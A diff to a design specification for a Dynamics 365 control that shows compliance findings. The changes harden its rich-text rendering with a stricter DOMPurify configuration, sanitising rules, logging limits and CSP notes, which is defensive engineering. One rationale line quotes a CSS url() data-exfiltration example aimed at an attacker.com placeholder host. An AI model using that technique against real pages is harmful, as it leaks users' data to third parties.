@@ -97,6 +97,8 @@ The expanded card's footer renders metadata in two tiers:
 
 **Tier 2 — Auto-discovered fields:** Any additional columns present in the dataset that are not already rendered elsewhere in the card (not `syg_name`, `syg_description`, `syg_riskseverity`, `syg_status`, `createdon`, or any Tier 1 field) are rendered as "Label: Value" pairs. This allows new columns added to the subgrid view to appear without a code change.
 
+**Security note:** Tier 2 auto-discovered fields rely on Dataverse field-level security to control visibility. The control renders whatever the dataset API returns — it does not implement additional field-level access control. Admins should be aware that adding columns to the subgrid view makes them visible to all users who can access the form.
+
 Layout: Horizontal flex-wrap with 16px gaps. Each item is "**Label:** Value" in 12px text.
 
 ### Empty State
@@ -139,21 +141,25 @@ Fallback: same as unknown risk severity.
 
 ### Rich Text Rendering
 
-- **Collapsed state:** Strip all HTML tags from `syg_description` to produce plain text. Use a utility function that extracts `textContent` from a temporary DOM element (or regex for simple cases). Truncate visually with CSS line-clamp.
+- **Collapsed state:** Strip all HTML tags from `syg_description` to produce plain text. **Must use DOM-based approach** — create a temporary element, set `innerHTML`, read `textContent`. Never use regex for HTML stripping (malformed tags can bypass naive regex patterns). Truncate visually with CSS line-clamp.
 - **Expanded state:** Sanitize the raw HTML via **DOMPurify** with the following configuration. Render the sanitized output. No unsanitized HTML is ever rendered.
   ```ts
-  DOMPurify.sanitize(html, {
+  const clean = DOMPurify.sanitize(html, {
     ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'b', 'i', 'u', 'ul', 'ol', 'li',
                    'table', 'thead', 'tbody', 'tr', 'th', 'td',
                    'img', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
-                   'span', 'div', 'a', 'blockquote', 'pre', 'code'],
-    ALLOWED_ATTR: ['src', 'href', 'alt', 'title', 'class', 'style',
-                   'colspan', 'rowspan', 'width', 'height', 'target', 'rel'],
-    ALLOWED_URI_REGEXP: /^(?:(?:https?|data):)/i, // Allow https and data: URIs (for base64 images)
+                   'span', 'div', 'blockquote', 'pre', 'code'],
+    ALLOWED_ATTR: ['src', 'alt', 'title', 'class',
+                   'colspan', 'rowspan', 'width', 'height'],
+    ALLOWED_URI_REGEXP: /^(?:https?:|data:image\/)/i, // Only https and data:image/ URIs
     ALLOW_DATA_ATTR: false,
   });
   ```
-  **Note:** `data:` URIs are allowed because Dataverse's rich text editor embeds images as base64 `data:image/...` in `img[src]`. The `ALLOW_DATA_ATTR` is false to block `data-*` attributes which are unnecessary.
+  **Security decisions:**
+  - **`style` attribute removed:** CSS `url()` references inside `style` attributes bypass DOMPurify's URI filtering and can be used for data exfiltration (`background-image: url('https://attacker.com/...')`). All styling is handled by the scoped CSS in `richText.ts` instead.
+  - **`a` tag removed:** Compliance findings should not contain hyperlinks. If the raw HTML contains `<a>` tags, DOMPurify strips them and the text content is preserved. This eliminates tabnabbing risks (`target="_blank"` without `rel="noopener"`) and phishing links embedded in findings.
+  - **`data:` URIs restricted to images only:** `data:image/` is allowed because Dataverse's rich text editor embeds images as base64. `data:text/html` and other MIME types are blocked to prevent XSS via data URI navigation.
+  - **`ALLOW_DATA_ATTR: false`:** Blocks `data-*` attributes which are unnecessary.
 - **Rich text base styles:** Apply scoped CSS within the expanded content area for:
   - `img`: `max-width: 100%; height: auto;`
   - `table`: `width: 100%; border-collapse: collapse; font-size: 12px;`
@@ -213,7 +219,7 @@ While the dataset is loading (`dataset.loading === true`), display a Fluent UI `
 
 ### Error Handling
 
-- **Navigation failures** (`openForm` calls): Caught silently with `console.warn`. The user remains on the current form.
+- **Navigation failures** (`openForm` calls): Caught silently with a generic `console.warn("Navigation failed")`. Do not log entity IDs, GUIDs, or error stack traces to the console in production — these could expose internal schema details to users with browser dev tools.
 - **Lookup resolution failures** (Web API calls for condition names): The field displays "Open Record" as a clickable fallback instead of the display name.
 - **DOMPurify failures** (malformed HTML): Falls back to plain text rendering (same as collapsed preview).
 - **Pagination failures** (`loadNextPage`): The "Load more" button shows an inline error message "Failed to load — try again" and remains clickable for retry.
@@ -232,6 +238,15 @@ While the dataset is loading (`dataset.loading === true`), display a Fluent UI `
 - **ARIA:** `aria-expanded` on card header, `aria-controls` pointing to expanded content region, `role="region"` on expanded content with `aria-label`.
 - **Color:** Risk severity and status badges always include text labels alongside color. Color is never the sole indicator.
 - **Screen readers:** Expanded content is announced when card is toggled.
+
+### Content Security Policy (CSP)
+
+The control runs within the D365 model-driven app iframe. CSP requirements:
+- `img-src data:` — required for base64-embedded images from the Dataverse rich text editor
+- No `style-src 'unsafe-inline'` needed — the `style` attribute is stripped by DOMPurify; all styling uses Fluent UI `makeStyles` (CSS-in-JS via `<style>` tags, which D365 already permits for PCF controls)
+- No external resource loading — all content is either from the dataset API or inline base64
+
+Verify compatibility with the target D365 environment's CSP policy before deployment. If base64 images fail to render, the CSP may need `img-src data:` added.
 
 ## Project Structure
 
@@ -276,6 +291,10 @@ EddFindingsViewer/
 - Bulk actions
 - Filtering/search within the control (rely on subgrid view filters)
 - Multiple cards expanded simultaneously
+
+### Future Security Considerations
+
+- **Audit trail:** EDD findings are regulated data. Consider emitting telemetry events when a user expands a finding (views full description), navigates to a linked condition, or creates a new finding. This could integrate with D365's built-in audit log or Application Insights for "who viewed what and when" compliance reporting.
 
 ## Acceptance Criteria
 
